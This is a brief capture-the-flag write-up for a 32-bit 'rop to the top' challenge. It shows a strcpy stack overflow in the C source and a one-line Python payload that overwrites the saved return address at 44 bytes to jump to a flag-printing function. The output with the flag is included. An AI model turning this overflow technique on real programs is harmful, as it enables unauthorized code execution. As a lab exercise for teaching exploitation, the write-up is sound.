### Solved by superkojiman

This was an easy challenge, not really sure where the ROP part comes into play though to be honest. The source code and binary are provided. There's an obvious buffer overflow in `fun_copy()` when the `input` parameter is copied into `destination` using `strcpy()`. 

```
void fun_copy(char *input){

    char destination[32];
    strcpy(destination, input);
    puts("Done!");
}
```

`input` is provided as an argument to the binary. All we neeed to do is overwrite the saved return pointer with the address of `the_top()` which prints out the contents of the flag file. 

The saved return pointer is 44 bytes from `destination`. Just overwrite it with the address of `the_top()` which is 0x080484db:

```
team837637@shell:/problems/roptothetop$ ./rop_to_the_top32 `python -c 'print "A"*44 + "\xdb\x84\x04\x08"'`
Now copying input...
Done!
actf{strut_your_stuff}
Segmentation fault (core dumped)
```
